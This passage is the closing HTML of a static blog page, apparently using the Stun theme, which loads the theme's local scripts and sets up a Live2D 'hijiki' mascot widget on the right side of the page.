src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>